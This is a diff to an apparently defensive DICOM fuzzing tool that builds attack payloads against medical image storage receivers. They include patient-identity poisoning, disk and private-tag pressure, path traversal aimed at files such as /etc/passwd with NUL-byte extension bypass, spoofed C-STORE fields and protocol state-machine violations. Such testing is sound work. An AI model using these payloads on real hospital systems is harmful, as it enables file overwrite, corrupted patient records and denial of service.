+    same-network peer can push objects into storage/import/database workflows:
+    identity validation, command-vs-dataset consistency, SOP class confusion,
+    disk pressure, and private-tag pressure.
+
+    Pure payload generators - no network I/O. Deliver with C-STORE; metadata
+    carries the Storage SOP Class, SOP Instance UID, and the coverage axis.
+    """
+
+    @staticmethod
+    def empty_required_identity_store() -> AttackResult:
+        """Store object with empty Patient Name and Patient ID."""
+        ds = _injection_base_dataset()
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', '')
+        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', '')
+        return AttackResult(
+            name='storage_empty_required_identity',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE object with both Patient Name and Patient ID empty',
+            expected_behavior='Storage SCP should reject, quarantine, or import '
+                              'without creating ambiguous patient records',
+            metadata={
+                'coverage_scope': 'identity-validation',
+                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def duplicate_patient_identity_conflict() -> AttackResult:
+        """Store object with duplicate conflicting patient identity tags."""
+        ds = Dataset()
+        ds._force_append(Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID))
+        ds._force_append(Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.30'))
+        ds._force_append(Element(0x0008, 0x0060, 'CS', 'OT'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Trusted^Patient'))
+        ds._force_append(Element(0x0010, 0x0010, 'PN', 'Injected^Patient'))
+        ds._force_append(Element(0x0010, 0x0020, 'LO', 'TRUSTED-ID'))
+        ds._force_append(Element(0x0010, 0x0020, 'LO', 'INJECTED-ID'))
+        ds._force_append(Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.30.1'))
+        ds._force_append(Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.30.2'))
+        return AttackResult(
+            name='storage_duplicate_patient_identity_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE object with duplicate conflicting patient identity tags',
+            expected_behavior='Storage/import path should reject or deterministically '
+                              'resolve duplicate identities without patient merge poison',
+            metadata={
+                'coverage_scope': 'identity-merge-poisoning',
+                'target_fields': ['(0010,0010) Patient Name', '(0010,0020) Patient ID'],
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5.30',
+            },
+        )
+
+    @staticmethod
+    def command_dataset_sop_class_conflict() -> AttackResult:
+        """Command Storage SOP class differs from dataset SOP Class UID."""
+        ds = _injection_base_dataset()
+        ds[0x00080016] = Element(0x0008, 0x0016, 'UI', MR_IMAGE_STORAGE_SOP_CLASS_UID)
+        return AttackResult(
+            name='storage_command_dataset_sop_class_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE command says Secondary Capture while dataset claims MR Image Storage',
+            expected_behavior='Storage SCP should reject or quarantine SOP class mismatch',
+            metadata={
+                'coverage_scope': 'command-dataset-sop-class-mismatch',
+                'command_sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'dataset_sop_class_uid': MR_IMAGE_STORAGE_SOP_CLASS_UID,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def command_dataset_instance_uid_conflict() -> AttackResult:
+        """Command Affected SOP Instance UID differs from dataset SOP Instance UID."""
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', '1.2.3.4.5.31')
+        return AttackResult(
+            name='storage_command_dataset_instance_uid_conflict',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description='C-STORE command and dataset carry different SOP Instance UIDs',
+            expected_behavior='Storage SCP should reject or handle UID mismatch deterministically',
+            metadata={
+                'coverage_scope': 'command-dataset-instance-uid-mismatch',
+                'command_sop_instance_uid': '1.2.3.4.5',
+                'dataset_sop_instance_uid': '1.2.3.4.5.31',
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def bulkdata_disk_pressure(size: int = 256 * 1024) -> AttackResult:
+        """Store object with a larger raw Pixel Data value for storage pressure."""
+        ds = _injection_base_dataset()
+        ds = ds / Element(0x0028, 0x0010, 'US', 512)
+        ds = ds / Element(0x0028, 0x0011, 'US', 512)
+        ds = ds / Element(0x0028, 0x0100, 'US', 8)
+        ds = ds / Element(0x7FE0, 0x0010, 'OB', b'X' * size)
+        return AttackResult(
+            name='storage_bulkdata_disk_pressure',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description=f'C-STORE object with {size} bytes of raw Pixel Data',
+            expected_behavior='Storage SCP should enforce quotas and remain available under repeated stores',
+            metadata={
+                'coverage_scope': 'storage-quota-disk-pressure',
+                'size': size,
+                'repeat_for_detection': 100,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def private_tag_pressure(count: int = 128) -> AttackResult:
+        """Store object with many private tags for scanner/import pressure."""
+        ds = _injection_base_dataset()
+        ds = ds / Element(0x0011, 0x0010, 'LO', 'C-SCARE')
+        for i in range(count):
+            ds = ds / Element(0x0011, 0x1000 + i, 'LO', f'private-{i:03d}')
+        return AttackResult(
+            name='storage_private_tag_pressure',
+            category='storage_abuse',
+            payload=ds.encode(),
+            description=f'C-STORE object with {count} private data elements',
+            expected_behavior='Storage/import path should bound private-tag processing and metadata insertion',
+            metadata={
+                'coverage_scope': 'private-tag-metadata-pressure',
+                'private_tag_count': count,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_no_dataset_flag_with_data() -> AttackResult:
+        """C-STORE command says no dataset while data PDV is present."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(
+            dataset=ds.encode(), data_set_type=0x0101)
+        return AttackResult(
+            name='storage_cstore_no_dataset_flag_with_data',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ Data Set Type says no dataset but a data PDV follows',
+            expected_behavior='Storage SCP should reject inconsistent C-STORE command/data state',
+            metadata={
+                'coverage_scope': 'cstore-command-data-set-type-mismatch',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_dataset_flag_without_data() -> AttackResult:
+        """C-STORE command says dataset present but no data PDV follows."""
+        payload, steps = _cstore_sequence_bytes(dataset=None, data_set_type=0x0000)
+        return AttackResult(
+            name='storage_cstore_dataset_flag_without_data',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ Data Set Type says dataset present but no data PDV follows',
+            expected_behavior='Storage SCP should not create partial files or database rows',
+            metadata={
+                'coverage_scope': 'cstore-missing-data-pdv',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_invalid_priority_with_dataset() -> AttackResult:
+        """C-STORE command uses an out-of-range Priority value."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(dataset=ds.encode(), priority=0xFFFF)
+        return AttackResult(
+            name='storage_cstore_invalid_priority_with_dataset',
+            category='storage_abuse',
+            payload=payload,
+            description='C-STORE-RQ uses invalid Priority value 0xFFFF with dataset',
+            expected_behavior='Storage SCP should reject or ignore invalid priority safely',
+            metadata={
+                'coverage_scope': 'cstore-invalid-priority',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @staticmethod
+    def cstore_move_originator_spoof() -> AttackResult:
+        """C-STORE command includes spoofed Move Originator fields."""
+        ds = _injection_base_dataset()
+        payload, steps = _cstore_sequence_bytes(
+            dataset=ds.encode(), move_originator_ae_title='ATTACKER',
+            move_originator_message_id=0xFFFF)
+        return AttackResult(
+            name='storage_cstore_move_originator_spoof',
+            category='storage_abuse',
+            payload=payload,
+            description='Standalone C-STORE-RQ carries spoofed Move Originator fields',
+            expected_behavior='Storage SCP should not trust Move Originator fields for authorization or routing',
+            metadata={
+                'coverage_scope': 'cstore-move-originator-spoofing',
+                'steps': steps,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every Storage SCP abuse payload."""
+        yield cls.empty_required_identity_store()
+        yield cls.duplicate_patient_identity_conflict()
+        yield cls.command_dataset_sop_class_conflict()
+        yield cls.command_dataset_instance_uid_conflict()
+        yield cls.bulkdata_disk_pressure()
+        yield cls.private_tag_pressure()
+        yield cls.cstore_no_dataset_flag_with_data()
+        yield cls.cstore_dataset_flag_without_data()
+        yield cls.cstore_invalid_priority_with_dataset()
+        yield cls.cstore_move_originator_spoof()
+
+
+# =============================================================================
 # Command Injection Attacks - shell metacharacters in storescp exec placeholders
 # =============================================================================
 
@@ -1229,6 +1830,7 @@ class CommandInjectionAttacks:
                 'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
                 'target_field': '(0020,000D) Study Instance UID',
                 'shell_payload': suffix,
+                'study_instance_uid': malicious,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': '1.2.3.4.5',
             },
@@ -1259,6 +1861,7 @@ class CommandInjectionAttacks:
                 'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
                 'target_field': '(0010,0010) Patient Name',
                 'shell_payload': suffix,
+                'patient_name': malicious,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': '1.2.3.4.5',
             },
@@ -1315,15 +1918,35 @@ class PathTraversalAttacks:
     _TRAVERSAL_PAYLOADS = [
         ('posix',    '../../../../../../tmp/c-scare-traversal',
          'POSIX relative traversal'),
+        ('posix_proof', '../../../../../../tmp/c-scare-traversal-proof',
+         'POSIX relative traversal with an unambiguous proof canary'),
+        ('etc_passwd', '../../../../../../etc/passwd',
+         'POSIX relative traversal targeting /etc/passwd overwrite'),
+        ('null_byte', '../../../../../../tmp/attacker-controlled.attacker\x00.DCM',
+         'POSIX traversal with attacker-controlled extension before NUL truncation'),
+        ('ui_pad_nul', '../../../../../../tmp/c-scare-ui-pad0',
+         'odd-length UI traversal relying on DICOM NUL padding'),
+        ('overlong_uid', '../../../../../../tmp/c-scare-' + ('A' * 80),
+         'over-64-character UI traversal value'),
+        ('vm_first', '../../../../../../tmp/c-scare-vm-first\\1.2.3.4.5',
+         'VM separator with malicious first SOP Instance UID value'),
+        ('vm_second', '1.2.3.4.5\\../../../../../../tmp/c-scare-vm-second',
+         'VM separator with malicious second SOP Instance UID value'),
         ('windows',  '..\\..\\..\\..\\..\\..\\Windows\\Temp\\c-scare-traversal',
          'Windows relative traversal'),
-        ('absolute', '/tmp/c-scare-traversal/escaped',
+        ('windows_absolute', 'C:\\Windows\\Temp\\c-scare-traversal',
+         'Windows drive-absolute path escaping the storage root'),
+        ('unc', '\\\\localhost\\share\\c-scare-traversal',
+         'Windows UNC path escaping the storage root'),
+        ('absolute', '/tmp/c-scare-traversal',
          'absolute path escaping the storage root'),
         ('mixed',    '..\\../..\\../..\\../c-scare-traversal',
          'mixed forward/back separators'),
         ('encoded',  '..%2f..%2f..%2f..%2fc-scare-traversal',
          'URL-encoded traversal sequence'),
     ]
+
+    _MULTI_FIELD_PROOF_ROOT = '../../../../../../tmp/c-scare-traversal-proof'
 
     @classmethod
     def _lookup(cls, payload_id: str) -> Tuple[str, str]:
@@ -1345,10 +1968,170 @@ class PathTraversalAttacks:
                               'before naming the received file',
             metadata={
                 'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'dataset-and-command-sop-instance-uid',
                 'target_field': '(0008,0018) SOP Instance UID',
                 'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
                 'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
                 'sop_instance_uid': value,
+            },
+        )
+
+    @classmethod
+    def command_sop_instance_uid_traversal(cls,
+                                           payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in C-STORE command Affected SOP Instance UID only.
+
+        Some receivers derive the stored filename from the DIMSE command set
+        instead of the dataset value. This keeps the dataset SOP Instance UID
+        benign while sending the malicious value as (0000,1000).
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        return AttackResult(
+            name=f'path_traversal_command_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'C-STORE command Affected SOP Instance UID carries a {note}',
+            expected_behavior='Receiver must sanitise the command SOP Instance UID '
+                              'before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'command-sop-instance-uid-only',
+                'target_field': '(0000,1000) Affected SOP Instance UID',
+                'dataset_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': value,
+            },
+        )
+
+    @classmethod
+    def dataset_only_sop_instance_uid_traversal(
+            cls, payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in dataset SOP Instance UID only.
+
+        This keeps the DIMSE command Affected SOP Instance UID benign so a
+        receiver that compares command-vs-dataset UIDs must reject or sanitise
+        the dataset value before any filesystem write.
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', value)
+        return AttackResult(
+            name=f'path_traversal_dataset_only_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'Dataset SOP Instance UID carries a {note} while the '
+                        'C-STORE command UID stays benign',
+            expected_behavior='Receiver must reject mismatched unsafe UIDs or '
+                              'sanitise before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'dataset-sop-instance-uid-only',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'dataset_sop_instance_uid': value,
+                'command_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def file_meta_sop_instance_uid_traversal(
+            cls, payload_id: str = 'null_byte') -> AttackResult:
+        """Path traversal in illegal-on-network File Meta SOP Instance UID.
+
+        Network C-STORE datasets should not contain group 0002 file meta, but
+        this probes receivers that accidentally parse (0002,0003) and use it
+        for storage naming anyway.
+        """
+        value, note = cls._lookup(payload_id)
+        ds = _injection_base_dataset()
+        ds._force_append(Element(0x0002, 0x0003, 'UI', value))
+        return AttackResult(
+            name=f'path_traversal_file_meta_sop_uid_{payload_id}',
+            category='path_traversal',
+            payload=ds.encode(),
+            description=f'File Meta Media Storage SOP Instance UID carries a {note}',
+            expected_behavior='Receiver must ignore illegal network file meta or '
+                              'sanitise before naming the received file',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'file-meta-sop-instance-uid',
+                'target_field': '(0002,0003) Media Storage SOP Instance UID',
+                'dataset_sop_instance_uid': '1.2.3.4.5',
+                'traversal_payload': value,
+                'regression_case': 'null-byte-extension-bypass'
+                                   if payload_id == 'null_byte' else None,
+                'dicom_ui_boundary': payload_id if payload_id in (
+                    'null_byte', 'ui_pad_nul', 'overlong_uid') else None,
+                'dicom_vm_boundary': payload_id if payload_id in (
+                    'vm_first', 'vm_second') else None,
+                'vm_separator': payload_id in ('vm_first', 'vm_second'),
+                'null_byte_filename_truncation': payload_id in (
+                    'null_byte', 'ui_pad_nul'),
+                'overlong_uid': payload_id == 'overlong_uid',
+                'attacker_controlled_extension': '.attacker'
+                                                 if payload_id == 'null_byte'
+                                                 else None,
+                'extension_bypass': '.DCM suffix may be hidden behind embedded NUL'
+                                    if payload_id in ('null_byte', 'ui_pad_nul')
+                                    else None,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
             },
         )
 
@@ -1405,16 +2188,79 @@ class PathTraversalAttacks:
         )
 
     @classmethod
+    def multi_field_storage_path_probe(cls) -> AttackResult:
+        """Put one proof canary across every common storage-naming field.
+
+        This is a benign proof-of-impact payload: a vulnerable receiver may
+        write a DICOM object or storage directory under the canary path, while a
+        partially sanitising receiver often leaves the canary text inside its
+        storage root. Either outcome is easy to distinguish from generic import
+        noise and identify in DUT-side filesystem monitoring.
+        """
+        root = cls._MULTI_FIELD_PROOF_ROOT
+        overrides = {
+            'SOPInstanceUID': f'{root}/sop-instance',
+            'StudyInstanceUID': f'{root}/study-instance',
+            'SeriesInstanceUID': f'{root}/series-instance',
+            'PatientName': f'{root}/patient-name',
+            'PatientID': 'CSCARE-PATH-PROOF',
+        }
+        ds = _injection_base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', overrides['SOPInstanceUID'])
+        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', overrides['StudyInstanceUID'])
+        ds[0x0020000E] = Element(0x0020, 0x000E, 'UI', overrides['SeriesInstanceUID'])
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', overrides['PatientName'])
+        ds[0x00100020] = Element(0x0010, 0x0020, 'LO', overrides['PatientID'])
+        return AttackResult(
+            name='path_traversal_multi_field_storage_probe',
+            category='path_traversal',
+            payload=ds.encode(),
+            description='SOP, Study, Series, and Patient fields carry the same '
+                        'path traversal proof canary',
+            expected_behavior='Receiver must reject the object or prove every '
+                              'storage path is canonicalised inside the intended '
+                              'root before filesystem writes occur',
+            metadata={
+                'cve': 'CVE-2022-2119',
+                'cves': ['CVE-2022-2119', 'CVE-2022-2120'],
+                'coverage_scope': 'multi-field-storage-path-proof',
+                'target_fields': [
+                    '(0008,0018) SOP Instance UID',
+                    '(0020,000D) Study Instance UID',
+                    '(0020,000E) Series Instance UID',
+                    '(0010,0010) Patient Name',
+                    '(0010,0020) Patient ID',
+                ],
+                'traversal_payload': root,
+                'proof_canary_leaf': 'c-scare-traversal-proof',
+                'expected_escape_prefixes': [
+                    '/tmp/c-scare-traversal-proof',
+                    '/var/tmp/c-scare-traversal-proof',
+                ],
+                'sanitized_storage_marker': 'c-scare-traversal-proof',
+                'cstore_field_overrides': overrides,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': overrides['SOPInstanceUID'],
+            },
+        )
+
+    @classmethod
     def all(cls) -> Generator[AttackResult, None, None]:
         """Yield every path-traversal attack payload."""
         # SOP Instance UID always names the received file: full sweep.
         for pid, _value, _note in cls._TRAVERSAL_PAYLOADS:
             yield cls.sop_instance_uid_traversal(pid)
+        yield cls.multi_field_storage_path_probe()
+        # Filename source ambiguity: command-only, dataset-only, and illegal
+        # file-meta variants for the highest-risk null-byte extension-bypass shape.
+        yield cls.command_sop_instance_uid_traversal('null_byte')
+        yield cls.dataset_only_sop_instance_uid_traversal('null_byte')
+        yield cls.file_meta_sop_instance_uid_traversal('null_byte')
         # Study Instance UID names the per-study dir (needs -su).
-        for pid in ('posix', 'windows', 'absolute'):
+        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
             yield cls.study_instance_uid_traversal(pid)
         # Patient Name names the per-patient dir (needs -sp).
-        for pid in ('posix', 'windows', 'absolute'):
+        for pid in ('posix', 'windows', 'windows_absolute', 'absolute'):
             yield cls.patient_name_traversal(pid)
 
 
@@ -1442,22 +2288,27 @@ class StateMachineAttacks:
             payload=pdu_bytes,
             description='P-DATA-TF in Sta1 (should only accept A-ASSOCIATE-RQ)',
             expected_behavior='Target should abort or ignore',
+            metadata={
+                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
+                'bug_class': 'unassociated-data',
+            },
         )
 
     @staticmethod
     def release_before_assoc() -> AttackResult:
         """A-RELEASE-RQ before association."""
-        if not SCAPY_AVAILABLE:
-            pdu_bytes = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
-        else:
-            pkt = DICOM() / A_RELEASE_RQ()
-            pdu_bytes = raw(pkt)
+        pkt = DICOM() / A_RELEASE_RQ()
+        pdu_bytes = raw(pkt)
         return AttackResult(
             name='release_before_assoc',
             category='state_machine',
             payload=pdu_bytes,
             description='A-RELEASE-RQ in Sta1',
             expected_behavior='Target should abort',
+            metadata={
+                'state': 'Sta1', 'reference': 'PS3.8 Table 9-10',
+                'bug_class': 'unassociated-release',
+            },
         )
 
     @staticmethod
@@ -1480,18 +2331,14 @@ class StateMachineAttacks:
         assoc_result = ProtocolAttacks.double_association()
         assoc_pdu = assoc_result.metadata['steps'][0]
 
-        if not SCAPY_AVAILABLE:
-            release_pdu = b'\x05\x00' + struct.pack('!I', 4) + b'\x00' * 4
-            pdata_pdu = b'\x04\x00' + struct.pack('!I', 20) + b'\x00' * 20
-        else:
-            release_pdu = raw(DICOM() / A_RELEASE_RQ())
-            cmd = C_ECHO_RQ(message_id=1)
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=1, is_command=1,
-                data=raw(cmd),
-            )
-            pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+        release_pdu = raw(DICOM() / A_RELEASE_RQ())
+        cmd = C_ECHO_RQ(message_id=1)
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=1, is_command=1,
+            data=raw(cmd),
+        )
+        pdata_pdu = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
 
         steps = [assoc_pdu, release_pdu, pdata_pdu]
         return AttackResult(
@@ -1509,15 +2356,12 @@ class StateMachineAttacks:
         assoc_result = ProtocolAttacks.double_association()
         assoc_pdu = assoc_result.metadata['steps'][0]
 
-        if SCAPY_AVAILABLE:
-            pdv = PresentationDataValueItem(
-                context_id=1,
-                is_last=0, is_command=0,  # Not last, not command
-                data=b'partial data here',
-            )
-            pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
-        else:
-            pdata = b'\x04\x00' + struct.pack('!I', 24) + b'\x00\x00\x00\x14\x01\x00' + b'partial data here'
+        pdv = PresentationDataValueItem(
+            context_id=1,
+            is_last=0, is_command=0,  # Not last, not command
+            data=b'partial data here',
+        )
+        pdata = raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
 
         steps = [assoc_pdu, pdata]
         return AttackResult(
@@ -1529,6 +2373,219 @@ class StateMachineAttacks:
             metadata={'steps': steps},
         )
 
+    # -------------------------------------------------------------------------
+    # Post-teardown transitions: bytes that arrive after the association is over
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def _assoc_pdu() -> bytes:
+        return raw_associate_rq(
+            'STORESCP', 'C-SCARE-FZ', VERIFICATION_SOP_CLASS_UID)
+
+    @staticmethod
+    def _echo_pdata(message_id: int = 1, context_id: int = 1,
+                    is_last: int = 1, is_command: int = 1) -> bytes:
+        pdv = PresentationDataValueItem(
+            context_id=context_id, is_last=is_last, is_command=is_command,
+            data=raw(C_ECHO_RQ(message_id=message_id)),
+        )
+        return raw(DICOM() / P_DATA_TF(pdv_items=[pdv]))
+
+    @staticmethod
+    def _abort_pdu(source: int = 0, reason: int = 0) -> bytes:
+        return raw(DICOM() / A_ABORT(source=source, reason_diag=reason))
+
+    @classmethod
+    def abort_then_pdata(cls) -> AttackResult:
+        """Keep sending after A-ABORT.
+
+        A-ABORT returns both sides to Sta1 immediately (PS3.8 9.2.3), so the
+        P-DATA-TF that follows belongs to no association. A target that keeps
+        the connection's parsing context alive after abort processes it
+        anyway.
+        """
+        steps = [cls._assoc_pdu(), cls._abort_pdu(), cls._echo_pdata()]
+        return AttackResult(
+            name='sm_abort_then_pdata',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='P-DATA-TF sent after the requestor issues A-ABORT',
+            expected_behavior='Target must discard the connection at A-ABORT and '
+                              'process nothing that follows',
+            metadata={'steps': steps, 'state': 'Sta1 after abort',
+                      'reference': 'PS3.8 9.2.3',
+                      'bug_class': 'post-abort-processing'},
+        )
+
+    @classmethod
+    def pdata_after_release_rp(cls) -> AttackResult:
+        """Data after release is complete."""
+        steps = [cls._assoc_pdu(), raw_release_rq(), cls._echo_pdata(message_id=2)]
+        return AttackResult(
+            name='sm_pdata_after_release_rp',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='P-DATA-TF after A-RELEASE-RQ, i.e. once release is under way',
+            expected_behavior='Target should abort rather than service data during '
+                              'or after release (Sta7/Sta13)',
+            metadata={'steps': steps, 'state': 'Sta7',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'post-release-processing'},
+        )
+
+    @classmethod
+    def release_collision(cls) -> AttackResult:
+        """Two A-RELEASE-RQs, the collision case of PS3.8 9.3.7.
+
+        Release collision is a real but rarely exercised branch: both sides
+        request release at once and the requestor must wait for A-RELEASE-RP
+        while the acceptor's own A-RELEASE-RQ is in flight.
+        """
+        steps = [cls._assoc_pdu(), raw_release_rq(), raw_release_rq()]
+        return AttackResult(
+            name='sm_release_collision',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='Second A-RELEASE-RQ while the first is unanswered',
+            expected_behavior='Target should follow the release-collision rules '
+                              'or abort, not double-free the association',
+            metadata={'steps': steps, 'state': 'Sta7',
+                      'reference': 'PS3.8 9.3.7',
+                      'bug_class': 'release-collision'},
+        )
+
+    # -------------------------------------------------------------------------
+    # Role reversal: acceptor PDUs sent by the requestor
+    # -------------------------------------------------------------------------
+
+    @classmethod
+    def associate_ac_from_requestor(cls) -> AttackResult:
+        """The requestor sends A-ASSOCIATE-AC, which only an acceptor may send.
+
+        An SCP that shares one PDU dispatch table between both roles will
+        parse an AC it can never legitimately receive.
+        """
+        ac_pdu = raw(DICOM() / A_ASSOCIATE_AC(
+            called_ae_title='STORESCP', calling_ae_title='C-SCARE-FZ'))
+        steps = [ac_pdu]
+        return AttackResult(
+            name='sm_associate_ac_from_requestor',
+            category='state_machine',
+            payload=ac_pdu,
+            description='A-ASSOCIATE-AC sent by the association requestor in Sta1',
+            expected_behavior='An acceptor must reject a PDU only it is allowed '
+                              'to send',
+            metadata={'steps': steps, 'state': 'Sta1',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'role-confusion'},
+        )
+
+    @classmethod
+    def release_rp_from_requestor(cls) -> AttackResult:
+        """A-RELEASE-RP sent by the requestor, which only an acceptor may send."""
+        rp_pdu = raw(DICOM() / A_RELEASE_RP())
+        steps = [cls._assoc_pdu(), rp_pdu]
+        return AttackResult(
+            name='sm_release_rp_from_requestor',
+            category='state_machine',
+            payload=b''.join(steps),
+            description='A-RELEASE-RP sent by the requestor in Sta6',
+            expected_behavior='Target should abort on a response PDU it never '
+                              'requested',
+            metadata={'steps': steps, 'state': 'Sta6',
+                      'reference': 'PS3.8 Table 9-10',
+                      'bug_class': 'role-confusion'},
+        )
+
+    # -------------------------------------------------------------------------
